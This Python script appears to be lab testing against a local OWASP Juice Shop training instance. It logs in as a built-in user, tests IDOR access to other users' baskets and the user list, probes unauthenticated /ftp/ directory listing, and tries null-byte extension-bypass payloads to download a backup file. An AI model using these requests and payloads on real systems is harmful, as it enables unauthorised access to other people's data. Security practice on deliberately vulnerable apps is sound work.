import os, json, urllib.request, urllib.error
for v in ("http_proxy","https_proxy","HTTP_PROXY","HTTPS_PROXY"): os.environ.pop(v,None)
os.environ["no_proxy"]="*"
BASE="http://127.0.0.1:3001"
op=urllib.request.build_opener(urllib.request.ProxyHandler({}))
def req(method, path, body=None, token=None, raw=False):
    url=BASE+path
    h={"Accept":"*/*"}
    data=None
    if body is not None:
        data=json.dumps(body).encode(); h["Content-Type"]="application/json"
    if token: h["Authorization"]="Bearer "+token
    r=urllib.request.Request(url, data=data, headers=h, method=method)
    try:
        resp=op.open(r,timeout=15); code=resp.status; b=resp.read()
    except urllib.error.HTTPError as e:
        code=e.code; b=e.read()
    except Exception as e:
        return 0, str(e)[:120].encode()
    return code, b

print("=== [53] IDOR /rest/basket/{id} ===")
# 普通用户登录（Juice Shop 内置账号 jim@juice-sh.op / ncc-1701）
c,b = req("POST","/rest/user/login",{"email":"jim@juice-sh.op","password":"ncc-1701"})
print("login jim:", c, b[:120])
tok=None
if c==200:
    tok=json.loads(b)["authentication"]["token"]
    uid=json.loads(b)["authentication"]["umail"]
    bid=json.loads(b)["authentication"]["bid"]
    print("  token ok, bid =", bid)
for target in ([1,2,bid] if tok else [1,2]):
    if tok:
        c2,b2=req("GET","/rest/basket/%d"%target,token=tok)
        print("  GET /rest/basket/%d (as jim) -> %s  body=%s"%(target,c2,b2[:100]))
        c3,b3=req("GET","/rest/basket/%d/items"%target if False else "/api/BasketItems/?basketId=%d"%target,token=tok)
    else:
        c2,b2=req("GET","/rest/basket/%d"%target)
        print("  GET /rest/basket/%d (no auth) -> %s  body=%s"%(target,c2,b2[:100]))
# 全量用户列表
c4,b4=req("GET","/api/Users/",token=tok)
print("  GET /api/Users/ (as jim) -> %s len=%d preview=%s"%(c4,len(b4),b4[:100]))

print()
print("=== [54] /ftp/ 目录浏览 未认证 ===")
for p in ["/ftp/","/ftp/quarantine/"]:
    c,b=req("GET",p)
    print("  %s -> %s len=%d  has_listing=%s"%(p,c,len(b), b'package.json.bak' in b or b'<a href' in b))
    print("    head:", b[:200].decode('utf-8','ignore').replace("\n"," "))

print()
print("=== [55] 空字节绕过 /ftp/package.json.bak ===")
tests=[("/ftp/package.json.bak","baseline 非法扩展名"),
       ("/ftp/package.json.bak%2500.md","%2500 空字节+白名单后缀"),
       ("/ftp/package.json.bak%00.md","%00 空字节"),
       ("/ftp/package.json","正常白名单外")]
for p,desc in tests:
    c,b=req("GET",p)
    print("  %-34s %-24s -> %s len=%d ct_ok=%s"%(p,desc,c,len(b), b[:20]))
